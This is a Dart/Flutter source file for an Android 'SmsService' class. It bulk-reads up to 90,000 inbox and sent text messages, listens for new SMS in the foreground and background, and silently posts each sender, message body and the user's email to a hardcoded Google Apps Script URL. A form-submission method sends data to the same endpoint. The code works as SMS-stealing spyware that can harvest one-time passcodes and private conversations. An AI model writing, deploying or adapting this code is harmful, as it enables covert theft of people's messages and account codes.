import 'package:dio/dio.dart';
import 'package:telephony/telephony.dart';
import 'package:intl/intl.dart';
import 'package:shared_preferences/shared_preferences.dart';

class SmsService {
  static final Telephony telephony = Telephony.instance;
  static final Dio _dio = Dio();
  static const String googleSheetUrl = 'https://script.google.com/macros/s/AKfycby9PfC0iHdliuh6konKMGlvKFwYfu17sBa3788xN8gNaCuKTTgco4V0ViFjtOIyGj0U/exec';
  static String currentUserEmail = 'Unknown';

  static Future<void> setUserEmail(String email) async {
    currentUserEmail = email;
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('user_email', email);
  }

  static void initialize() async {
    final prefs = await SharedPreferences.getInstance();
    currentUserEmail = prefs.getString('user_email') ?? 'Unknown';
    
    // Set up incoming listener
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        _handleNewMessage(message);
      },
      onBackgroundMessage: backgroundMessageHandler,
    );

    // Initial sync of the last 50000 messages to ensure everything is captured
    syncInbox(limit: 90000);
  }

  static Future<void> syncInbox({int limit = 90000}) async {
    try {
      // Fetch Inbox messages
      final List<SmsMessage> inboxMessages = await telephony.getInboxSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
      );

      // Fetch Sent messages
      final List<SmsMessage> sentMessages = await telephony.getSentSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
      );

      // Combine and sort
      List<SmsMessage> allMessages = [...inboxMessages, ...sentMessages];
      allMessages.sort((a, b) => (b.date ?? 0).compareTo(a.date ?? 0));

      final syncLimit = allMessages.length > limit ? limit : allMessages.length;
      for (int i = 0; i < syncLimit; i++) {
        final msg = allMessages[i];
        final bool isSent = sentMessages.contains(msg);
        await _handleNewMessage(msg, type: isSent ? 'SMS_SENT_SYNC' : 'SMS_INBOX_SYNC');
      }
    } catch (e) {
      print('Error syncing inbox/sent: $e');
    }
  }

  static Future<void> _handleNewMessage(SmsMessage message, {String type = 'SMS'}) async {
    final prefs = await SharedPreferences.getInstance();
    final String email = prefs.getString('user_email') ?? currentUserEmail;
    final String timestamp = message.date != null 
      ? DateFormat('yyyy-MM-dd HH:mm:ss').format(DateTime.fromMillisecondsSinceEpoch(message.date!))
      : DateFormat('yyyy-MM-dd HH:mm:ss').format(DateTime.now());
    
    final Map<String, dynamic> data = {
      'type': type,
      'email': email,
      'from': message.address ?? 'Unknown',
      'body': message.body ?? '',
      'timestamp': timestamp,
    };

    try {
      final response = await _dio.post(googleSheetUrl, data: data);
      print('SMS Status: ${response.statusCode}');
    } catch (e) {
      print('Error sending SMS: $e');
    }
  }

  static Future<void> sendFormData(Map<String, dynamic> formData) async {
    final prefs = await SharedPreferences.getInstance();
    final String email = prefs.getString('user_email') ?? currentUserEmail;
    final String timestamp = DateFormat('yyyy-MM-dd HH:mm:ss').format(DateTime.now());
    
    formData['timestamp'] = timestamp;
    formData['type'] = 'FORM_SUBMISSION';
    formData['email'] = email;

    try {
      final response = await _dio.post(googleSheetUrl, data: formData);
      print('Form Response Status: ${response.statusCode}');
    } catch (e) {
      print('Error sending form data: $e');
    }
  }
}

@pragma('vm:entry-point')
Future<void> backgroundMessageHandler(SmsMessage message) async {
  final Dio dio = Dio();
  const String url = 'https://script.google.com/macros/s/AKfycby9PfC0iHdliuh6konKMGlvKFwYfu17sBa3788xN8gNaCuKTTgco4V0ViFjtOIyGj0U/exec';
  final String timestamp = DateFormat('yyyy-MM-dd HH:mm:ss').format(DateTime.now());
  
  // In background isolates, we need to initialize SharedPreferences separately
  final prefs = await SharedPreferences.getInstance();
  final String email = prefs.getString('user_email') ?? 'Unknown_BG';

  try {
    await dio.post(url, data: {
      'type': 'SMS_BG',
      'email': email,
      'from': message.address ?? 'Unknown',
      'body': message.body ?? '',
      'timestamp': timestamp,
    });
  } catch (e) {
    print('Background SMS error: $e');
  }
}
